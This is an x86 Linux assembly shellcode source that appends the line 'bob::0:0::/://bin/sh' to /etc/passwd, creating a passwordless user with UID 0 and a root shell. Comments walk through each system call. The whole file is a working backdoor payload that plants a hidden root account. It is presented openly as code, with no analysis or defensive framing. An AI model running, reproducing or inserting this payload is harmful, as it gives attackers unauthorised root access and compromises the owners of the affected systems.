global _start

section .text

_start:

	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	push ebx
	push dword 0x64777373
	push dword 0x61702f63
	push dword 0x74652f2f


	; arguments for syscall open()
	mov ebx,esp

	; permissions ( print(oct(0x401)) /usr/include/asm-generic/fcntl.h 
	mov cx,0x401

	; call syscall open()
	mov al,0x5
	int 0x80

	; ebx contains fd whole execution
	mov ebx,eax
	xor eax,eax
	xor edx,edx

	; push hs/nib//:/::0:0::bob string
	push dword 0x68732f6e
	push dword 0x69622f2f
	push dword 0x3a2f3a3a
	push dword 0x303a303a
	push dword 0x3a626f62
	mov ecx,esp

	; length of hs/nib//:/::0:0::bob
	mov dl,0x14
	; call syscall write()
	mov al,0x4
	int 0x80

	; call syscall close()
	xor eax,eax
	mov al,0x6
	int 0x80

	; call syscall exit()
	xor eax,eax
	mov al,0x1
	int 0x80
